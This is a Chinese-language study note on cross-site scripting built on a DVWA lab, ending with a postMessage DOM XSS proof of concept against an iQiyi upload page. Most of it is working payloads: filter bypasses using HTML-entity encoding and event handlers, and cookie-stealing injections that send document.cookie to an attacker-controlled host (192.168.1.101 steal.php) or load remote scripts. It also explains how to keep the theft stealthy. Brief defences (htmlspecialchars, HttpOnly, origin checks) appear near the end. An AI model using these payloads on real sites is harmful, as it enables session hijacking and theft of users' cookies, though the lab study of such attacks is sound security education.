## dvwa学习xss

### 测试环境

win7虚拟机 ，ip 192.168.255.151，用phpstudy将dvwa 环境 搭在 8081端口

一台物理机，ip 192.168.1.101,作为我的vps，用于获取xss返回的cookie,用phpstudy搭建的环境，808端口存有 cookie.js，steal.php等文件

火狐浏览器，谷歌浏览器有 xss filter

文件说明：

cookie.js 为获取cookie的js,没使用ajax，会跳转到密码修改成功页面，不推荐使用。

b.js 为js操作ajax，支持最为广泛，payload 代码量较少。

c.js 为jq操作ajax，需要payload引入支持jq的js，payload 较长。

steal.php 为 操作数据库的 php，将js 获取 的cookie 等 存入 vps的数据库。

搭建数据库sql：

```

	create database dvwacookie;
	
	use dvwacookie;
	
	create table low(id int not null auto_increment primary key,cookie varchar(100) not null);

	create table medium(id int not null auto_increment primary key,cookie varchar(100) not null);

	create table high(id int not null auto_increment primary key,cookie varchar(100) not null);

```


### 参考资料

[新手科普 通过DVWA学习XSS](https://www.freebuf.com/articles/web/157953.html)

[针对不同标签的xss利用汇总](https://www.cnblogs.com/xiaozi/p/5588099.html)

[xssbypass](https://d3adend.org/xss/ghettoBypass)

[xss变形](https://www.jb51.net/tools/xss.htm)


### xss介绍

WEB前端中最常见的两种安全风险，XSS与CSRF，XSS，即跨站脚本攻击、CSRF即跨站请求伪造,两者属于跨域安全攻击。

XSS的Payload一般是写在URL中，之后设法让被害者点击这个链接

xss分为 存储型，反射型，dom型。

XSS的Payload一般是写在URL中，之后设法让被害者点击这个链接

存储型xss 通过留言板等输入框注入的脚本存在于靶机服务器的数据库中

反射性xss 利用脚本与服务器交互，绕过限制

DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段。

简单理解DOM XSS就是出现在javascript代码中的xss漏洞。

DOM型XSS是前端代码中存在了漏洞，而反射型和存储型是后端代码中存在了漏洞。

反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。

### xss危害

获取到用户的cookie信息或者劫持用户跳转到钓鱼网站
 

### 专用扫描工具

XSSER,XSSF等

工具扫描效率高存在误报，不如手动扫描准确。

### xss利用


#### 注入方式

1双写绕过

2大小写混淆绕过

3虽然无法使用```<script>```标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。

```

	<iframe src=1 onload='alert(1)' /><iframe>

	<iframe src=1 onmouseover=alert('xss') y=2016 /><iframe>
	
	<iframe src="../csrf" onload='alert(frames[0].document.getElementsByName("user_token")[0].value)'>

	<img src=1 onerror=alert(/xss/)>

	<body onload='alert(/xss/)'</body>

	<svg onload=alert("xss")>
	
```

4 dom xss 注入

4.1 标签闭合  （会破坏页面结构，隐蔽性不如注释方法）

```></option></select><img src=1 onerror=alert('hack')>```

```</option></select><svg onload=alert("xss")>```
 
4.2  注释

``` #<script src=http://192.168.1.101:808/b.js></script>``` 
\#会注释掉，后面的内容不会发送到后台

5. 存储型和反射型xss

为了绕过  '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'  正则，

可将插入代码中的i进行html字符实体编码以绕过正则

```<img src=# onerror=(locat&#x69;on.href="http://192.168.1.101:8081/steal.php?data="+document.cookie)>```

直接跳转到steal.php

[**html字符 转换 字符实体在线编码**](https://www.qqxiuzi.cn/bianma/zifushiti.php)

在python 中解码函数 print (html.unescape('&#20013;&#22269;'))


js操作ajax(注入字符过多，不推荐)

```
	<img src=# onerror='var url="http://192.168.1.101:808/steal.php";var postStr="data="+document.cook&#x69;e;var ajax=null;&#x69;f(w&#x69;ndow.XMLHttpRequest){ajax=new XMLHttpRequest();}else &#x69;f(w&#x69;ndow.Act&#x69;veXObject){ajax=new Act&#x69;veXObject("M&#x69;crosoft.XMLHTTP");}else{ajax=null;}ajax.open("POST",url,true);ajax.setRequestHeader("Content-Type", "appl&#x69;cat&#x69;on/x-www-form-urlencoded");ajax.send(postStr);'>
```

jq操作ajax(注入字符过多，不推荐)(这里使用短链接会异常，应该是浏览器解析dom的问题)

```
	<img src=# onerror="var a=document.createElement('scr&#x69;pt');a.setAttr&#x69;bute('src', 'https://dwz.cn/tA0Ob030');document.getElementsByTagName('head')[0].appendCh&#x69;ld(a);var b= document.createElement('scr&#x69;pt'); b.setAttr&#x69;bute('src','http://192.168.1.101:808/c.js');document.getElementsByTagName('head')[0].appendChild(b);">
```

```ALTER TABLE guestbook MODIFY name VARCHAR(180);```

**js操作原生态ajax,不用引用jquery，最节省代码**,171字符

```	
	<img src=# onerror="var b= document.createElement('scr&#x69;pt');
	b.setAttribute('src','http://192.168.1.101:808/b.js');
	document.getElementsByTagName('head')[0].appendChild(b);">
```

6.限制输入字符长度的浏览器注入方法

chrome: F12 ，Elements , 选定元素，Edit as HTML

firefox:F12 ，inspector/查看器，编辑html， 修改 maxlength

7.记录cookie

	<img src=# onerror=(location.href="http://192.168.1.101:808/steal.php?data="+document.cookie)>


这种方式有个缺点就是将cookie发送到steal.php后他会刷新页面跳转到steal.php，所以要用ajax优化

在有xss漏洞的位置插入:


```<script src=http://192.168.1.101:808/cookie.js></script>```

相当于构造链接:

```http://192.168.255.151:8081/DVWA-master/vulnerabilities/xss_r/?name=<script src=http://192.168.1.101:808/cookie.js></script>```

也可以用jquery操作ajax，但是需要引入头文件例如 ```https://cdn.bootcss.com/jquery/1.10.2/jquery.min.js```

[**百度短网址**](https://dwz.cn/)

[**免注册短网址生成**](https://zxso.net/tool/shorturl.php)

```<script src=https://dwz.cn/tA0Ob030></script><script src=http://192.168.1.101:808/c.js></script>```   成功跨域获取cookie,压缩到刚好100字节(还可以服务器使用80端口继续压缩字节)

**将链接发给该网站下的受害者，受害者点击时就会加载远程服务器（vps）上的cookie.js脚本，这里要提一点，用src加载远程服务器的js脚本，那么js的源就会变成加载它的域，从而可以读取该域的数据。这时，vps的数据库就接收到了cookie。**

观察firebug的javascript控制台，看到已拦截跨源请求：同源策略禁止读取位于 ```http://192.168.1.101:808/steal.php``` 的远程资源。（原因：CORS 头缺少 'Access-Control-Allow-Origin'）

因为ajax严格遵从同源策略，当前加载cookie.js的域为```http://192.168.255.151:8081```,所以ajax不能读取不同域```http://192.168.1.101```下的数据，但是cookie已经被发送到了```http://192.168.1.101```域，steal.php已经将偷取到的cookie存放在了数据库中,而且页面没有刷新，很隐蔽。



### xss反制

htmlspecialchars 把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。转义可能引起跨站漏洞的标签

http层做到防护，给cookie设置httponly属性，使cookie不能被javascript读取，才能有效防止用户cookie被盗用的问题



### 19.08.15 dom xss 进阶


#### HTML BOM Browser对象

BOM：Browser Object Model，即浏览器对象模型，提供了独立于内容的、可以与浏览器窗口进行互动的对象结构。

Browser对象：指BOM提供的多个对象，包括：Window、Navigator、Screen、History、Location等。

 [Location 对象](https://www.runoob.com/jsref/prop-loc-hash.html) 

```location.hash```	设置或返回从井号 (#) 开始的 URL（锚）,包含 # 号

例如： ```http://localhost:808/3.jpg#1```

location.hash   :    ```"#1"```

不安全的js 代码：

	eval(location.hash.substr(1))

获取 url 中 # 号后面的部分，不含 # 号。

```#document.write("<script/src=//http://localhost:808/a.js></script>")```

本地测试未成功


**PostMessage 跨域**

[postMessage API](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

[浅谈跨域威胁与安全](https://www.freebuf.com/articles/web/208672.html)


PostMessage跨域是H5新引入的实现跨域窗口之间的通讯，可以安全地实现windows对象之间的跨域通信。

有一个接受消息的窗口，一般用window.addEventListener(“message”,receiveMessage.false),用以接受消息数据

PostMessage实现流程

1、创建一个页面A，定义一个Postmessage方法

2、创建一个页面B，定义一个window.addEventListener(“message”，function）方法接受来源于Postmessage方法的消息

3、页面A使用Iframe标签包含页面B，触发Postmessage方法即可


targetOrigin设为*的话，其含义是不检查目标窗口的origin，与该参数是否匹配。


接收postMessage发送的信息MessageEvent, MessageEvent 约束source源，否则所有ip来源都可跨域

	window.addEventListener("message", function(MessageEvent){
	  var origin = event.origin || event.originalEvent.origin; 
	  if (event.source!=window.parent) return;
	  ....
	  }, false);

window.parent 返回当前窗口的父对象

比如一个A页面利用iframe或frame调用B页面，那么A页面所在窗口就是B页面的parent

MessageEvent 消息有四个属性需要注意： message 属性表示该message 的类型； data 属性为 window.postMessage 的第一个参数；origin 属性表示调用window.postMessage() 方法时调用页面的当前状态； source 属性记录调用 window.postMessage() 方法的窗口信息。

**理论基础**：

DOM based XSS 的产生原因，我们只需要关注两个方面

A） 脏数据的输入

location

document.referrer

window.name

ajax response

jsonp

form下的inputs框

 

B) 脏数据的输出

document.write(ln)

innerHTML =

outterHTML =

写 window.location 操作

写 javascript: （伪协议后内容的自定义）

eval、setTimeout 、setInterval 等直接执行

关于DOM XSS 的输入点， "DOM XSS之父stefano.dipaola" [总结了一个表](http://code.google.com/p/domxsswiki/)：

[window.postmessage 劫持](https://www.freebuf.com/vuls/194714.html)



#### 19.08.15 爱奇艺dom xss

漏洞页面 ```http://www.iqiyi.com/common/upload.html```

提交给漏洞盒子。过了一个礼拜，说我的复现步骤写的不详细。访问漏洞页面，已经404。厂商已经偷偷修复。

upload.html 第208-223行，存在xss漏洞的方法
	
	window.addEventListener('message', function(e) {
				clearTimeout(timeout);
	            if (e.data.code == 'A00000') {
					$('#loading').addClass('hide');
	                $('#imgSrc').attr('src', e.data.data.url);
	                $('#msg').html(e.data.data.message);
					var share = successShare[e.data.data.star];
					shareLink = 'http://new.cms.iqiyi.com/page!preview.action?pageId=3043979&photoId=' + e.data.data.photoId;
					shareTitle.splice(0, shareTitle.length, e.data.data.message);
					shareText.splice(0, shareText.length, share.shareText);
					sharePic.splice(0, sharePic.length, share.sharePic);
	                $('#page5').removeClass('hide');
	            } else {
	                location.href = 'http://new.cms.iqiyi.com/page!preview.action?pageId=3043981';
	            }
	        }, false);

这是H5中跨域信息传递的方法，该方法没有验证来源域，同时```$('#msg').html()```方法未过滤

存在漏洞的函数：
	
	$('#msg').html(e.data.data.message);

传入 $('#msg') 的值 e.data.data.message 未经过滤 就直接写入 html


我开始时写的poc：
	
	window.postMessage({code:'A00000',data:{message:alert(location.href)}}, 'http://www.iqiyi.com/common/upload.html');

这个有点问题， alert() 弹出的是当前域，可以用  注入标签 img src onerror方法注入到漏洞页面。
这时候 alert的就是 漏洞页面的 信息。

构造poc 

	<script type="text/javascript">
	function a(){
	var a = document.getElementById('frame').contentWindow;
	a.postMessage({
	code:'A00000',
	data:{
	message: '<img src=1 onerror=alert(document.domain)>'
	}
	}, 'http://www.iqiyi.com');
	}
	</script>

修复建议:

对 消息的来源进行过滤，限制只能接受 iqiyi.com 发来的消息等。

	window.addEventListener('message', function(e) { 
	
	if (e.origin !== "http://www.iqiyi.com") return;}